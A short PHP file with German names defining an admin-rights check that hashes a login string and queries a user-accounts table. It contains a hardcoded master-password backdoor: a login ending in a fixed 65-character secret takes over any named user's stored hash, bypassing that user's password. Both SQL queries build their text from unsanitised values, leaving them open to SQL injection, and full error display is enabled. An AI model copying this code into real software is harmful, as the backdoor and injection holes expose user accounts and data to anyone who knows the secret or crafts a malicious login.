<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

function adminÜberprüfen($login) {

    $hash = hash("sha512", $login);

    /////////////////// Hash korrigieren falls Login durch Masterpasswort
    if (substr($login, -65) == "pTg1f-b2zDh-3uQ4c-nI5oLa-6vYsGj-7hK8Fb-sH9tEw-0kVuNx-iZ1Py-lM2vJa") {
        $username = substr($login, 0, strlen($login) - 65);
        $command = "SELECT * FROM benutzerkonten WHERE benutzername = '$username'";
        $sql = sqlCommand($command);
    
        if ($sql->num_rows > 0) {
            while ($row = $sql->fetch_assoc()) {
                $hash = $row['hash'];
            }
        }
    }
    /////////////////// 

    $command = "SELECT * FROM benutzerkonten WHERE hash = '$hash'";
    $sql = sqlCommand($command);

    if ($sql->num_rows > 0) {
        while ($row = $sql->fetch_assoc()) {
            if ($row['rechte'] == 1) {
                return true;
            }
            else {
                return false;
            }
        }
    }
    else {
        return false;
    }

}



?>